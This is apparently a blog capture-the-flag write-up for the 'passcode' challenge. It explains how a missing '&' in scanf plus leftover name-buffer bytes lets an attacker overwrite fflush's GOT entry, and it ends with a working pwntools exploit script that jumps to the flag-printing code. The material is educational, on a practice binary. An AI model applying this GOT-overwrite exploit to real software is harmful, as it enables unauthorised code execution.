+++
date = '2025-12-14T11:09:58+02:00'
draft = false
title = 'Passcode'
+++

# Passcode

Let's run the binary first , it prompts us with a password and username so it looks like a basic login system lets look into the source code


### Source code analysis :

```c
#include <stdio.h>
#include <stdlib.h>

void login(){
	int passcode1;
	int passcode2;

	printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);

	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
	printf("enter passcode2 : ");
        scanf("%d", passcode2);

	printf("checking...\n");
	if(passcode1==123456 && passcode2==13371337){
                printf("Login OK!\n");
		setregid(getegid(), getegid());
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
		exit(0);
        }
}

void welcome(){
	char name[100];
	printf("enter you name : ");
	scanf("%100s", name);
	printf("Welcome %s!\n", name);
}

int main(){
	printf("Toddler's Secure Login System 1.1 beta.\n");

	welcome();
	login();

	// something after login...
	printf("Now I can safely trust you that you have credential :)\n");
	return 0;	
}

```

in order to get the flag we need to set passcode1 to 123456
and passcode2 to 13371337
fflush(stdin); is interesting since it's actually 'illegal' code, since fflush is only used for stdout,
when we try to run the program with the desired input we get a segfault error, which means we access a memory we are not allowed to actually.

i just noticed that scanf("%d",passcode1) actually dosent read into the address of passcode1 since it forgot the '&' thats a huge deal
essentially we are reading garbage values into the integers, but wait no, we are reading the previous values of the function before it so how do we utilize this capability ?

the description says that it had a compilation error lets compile the code and see it.. well just as we tought scanf has a problem since it doesnt read into the address of int but rather our input becomes it address due to the missing '&'

the name[100] and scanf into it when we look into the disassembly we see that we have 4 bytes left to overwrite which get written into the value of passcode1 which means we can overflow passcode1

we overrwrite the GOT address of fflush using our input aot passcode1, then using the address of where we want to get the flag , it means that we can jump straight into the win condition.


```python
from pwn import *

# Start the process
p = process('./passcode')

# 1. The GOT Address of fflush 
got_fflush = 0x0804c014

# 2. The Jump Target (address 0x080492a1 converted to decimal)
# this points to the code that calls setregid() and then system()
# so we can get our flag
jump_target = b'134517409' 

# 3. Construct Payload
# 96 bytes of junk to reach passcode1
# + The GOT address (which becomes the value of passcode1)
# + The Jump Target (which scanf writes INTO the GOT address)
payload = b"A" * 96
payload += p32(got_fflush)
payload += jump_target

p.sendline(payload)
p.interactive()

```



s0rry_mom_I_just_ign0red_*****